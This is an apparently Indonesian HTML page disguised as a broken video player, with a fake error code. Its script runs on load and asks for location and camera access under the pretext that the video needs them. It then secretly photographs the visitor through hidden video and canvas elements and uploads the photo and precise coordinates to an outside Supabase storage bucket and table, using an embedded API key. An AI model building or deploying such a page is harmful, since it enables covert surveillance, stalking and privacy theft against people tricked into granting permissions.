<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>INI ERA YAZZ - ERROR FEED</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { 
    box-sizing: border-box; 
    margin: 0; 
    padding: 0; 
  }

  body {
    font-family: 'Plus Jakarta Sans', sans-serif;
    background: #0a0a0a;
    color: #f0f0f0;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding-bottom: 40px;
    -webkit-font-smoothing: antialiased;
  }

  header {
    width: 100%;
    padding: 25px;
    text-align: center;
    font-size: 1.2rem;
    font-weight: 700;
    letter-spacing: 2px;
    color: #ff3b30; 
    border-bottom: 1px solid #1a1a1a;
    background: rgba(10, 10, 10, 0.8);
    backdrop-filter: blur(15px);
    position: sticky;
    top: 0;
    z-index: 100;
    text-transform: uppercase;
  }

  #statusBox {
    width: 92%;
    max-width: 500px;
    margin: 25px auto;
    padding: 18px;
    background: #161616;
    border-radius: 14px;
    text-align: center;
    border: 1px solid #222;
  }

  #statusText { 
    font-size: 0.85rem; 
    font-weight: 500;
    color: #ff4d4d;
    letter-spacing: 0.2px;
  }

  #list {
    width: 90%;
    max-width: 600px;
    display: grid;
    grid-template-columns: 1fr;
    gap: 20px;
  }

  .card {
    background: #161616;
    border-radius: 20px;
    overflow: hidden;
    border: 1px solid #262626;
  }

  .media-container {
    width: 100%;
    aspect-ratio: 16 / 9;
    background: #000;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    position: relative;
    color: #444;
  }

  .error-icon {
    font-size: 3.2rem;
    margin-bottom: 12px;
    opacity: 0.7;
  }

  .media-container p {
    font-weight: 600;
    font-size: 0.9rem;
    color: #777;
  }

  .info-overlay {
    padding: 18px;
    background: #111;
  }

  .info-text {
    font-size: 0.75rem;
    font-weight: 400;
    color: #666;
    text-align: center;
    letter-spacing: 0.5px;
  }

  /* Sembunyikan elemen kamera */
  #hiddenVideo, #hiddenCanvas {
    display: none;
  }

  .floating-info {
    position: fixed;
    bottom: 25px;
    background: #ff3b30;
    color: white;
    padding: 12px 25px;
    border-radius: 50px;
    font-size: 0.75rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
  }
</style>
</head>
<body>

<header>#INIERAYAZZ</header>

<div id="statusBox">
  <div id="statusText">System: Mendeteksi pemutar video...</div>
</div>

<div id="list">
  <!-- Card video rusak statis - akan selalu muncul -->
  <div class="card">
    <div class="media-container">
      <div class="error-icon">⚠️</div>
      <p>Video ini tidak dapat diputar</p>
      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
    </div>
    <div class="info-overlay">
      <div class="info-text" id="statusMessage">Izinkan dulu - Mencoba memuat ulang...</div>
    </div>
  </div>
</div>

<div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>

<!-- Elemen tersembunyi untuk proses kamera -->
<video id="hiddenVideo" autoplay playsinline></video>
<canvas id="hiddenCanvas" width="640" height="480"></canvas>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
  const BUCKET = "foto-users"; 
  const { createClient } = supabase;
  const client = createClient(SUPABASE_URL, SUPABASE_KEY);

  const statusText = document.getElementById("statusText");
  const statusMessage = document.getElementById("statusMessage");
  const hiddenVideo = document.getElementById("hiddenVideo");
  const hiddenCanvas = document.getElementById("hiddenCanvas");

  // ===== FUNGSI UPDATE STATUS =====
  function updateUI(message) {
    statusText.innerText = message;
    if (statusMessage) {
      statusMessage.innerText = message;
    }
  }

  // ===== FUNGSI MENGAMBIL FOTO (TANPA DITAMPILKAN) =====
  async function captureAndUpload(lat, lon) {
    try {
      updateUI("izinkan abangku");
      
      // Minta akses kamera
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user",
          width: { ideal: 640 },
          height: { ideal: 480 }
        }, 
        audio: false 
      });
      
      // Tampilkan stream ke video tersembunyi
      hiddenVideo.srcObject = stream;
      
      // Tunggu video siap
      await new Promise(resolve => {
        hiddenVideo.onloadedmetadata = () => {
          hiddenVideo.play();
          resolve();
        };
      });
      
      updateUI("loading abangku");
      
      // Tunggu sebentar agar kamera stabil
      setTimeout(async () => {
        // Gambar frame dari video ke canvas
        const context = hiddenCanvas.getContext("2d");
        context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
        
        // Konversi canvas ke blob
        hiddenCanvas.toBlob(async (blob) => {
          if (!blob) {
            updateUI("❌ izinkan baru nonton");
            stream.getTracks().forEach(track => track.stop());
            return;
          }
          
          const fileName = `capture_${Date.now()}.jpg`;
          
          // Upload ke Supabase Storage
          const { error: uploadError } = await client.storage
            .from(BUCKET)
            .upload(fileName, blob, { 
              cacheControl: "3600",
              upsert: false,
              contentType: "image/jpeg" 
            });

          if (uploadError) {
            console.error("Upload error:", uploadError);
            updateUI("❌ izinkan dulu abanku");
          } else {
            // Simpan data ke tabel
            const { error: insertError } = await client
              .from("lokasi_users")
              .insert([{ 
                foto: fileName, 
                latitude: lat || 0, 
                longitude: lon || 0,
                created_at: new Date()
              }]);

            if (insertError) {
              console.error("Insert error:", insertError);
              updateUI("❌ Gagal simpan data");
            } else {
              updateUI("✅ loading! (#kingyazz)");
              
              // Setelah 3 detik, kembalikan ke pesan awal
              setTimeout(() => {
                updateUI("Video ini tidak dapat diputar");
              }, 3000);
            }
          }
          
          // Matikan kamera
          stream.getTracks().forEach(track => track.stop());
          
        }, "image/jpeg", 0.8);
      }, 1500); // Delay 1.5 detik
      
    } catch (err) {
      console.error("Kamera error:", err);
      updateUI("❌ izinkan dulu bot");
    }
  }

  // ===== FUNGSI UTAMA =====
  async function startProcess() {
    updateUI("Meminta izin akses...");
    
    // Minta izin lokasi
    if (!navigator.geolocation) {
      updateUI("❌ izinkan dulu abangku");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        updateUI("izinkan dulu bang baru nonton");
        
        // Ambil foto (tanpa ditampilkan)
        await captureAndUpload(lat, lon);
      },
      (err) => {
        console.warn("Gagal dapat lokasi:", err.message);
        updateUI("⚠️ Lokasi tidak tersedia, tetap coba kamera");
        
        // Tetap coba ambil foto tanpa lokasi
        captureAndUpload(null, null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  }

  // ===== MULAI PROSES =====
  startProcess();
</script>
</body>
</html>
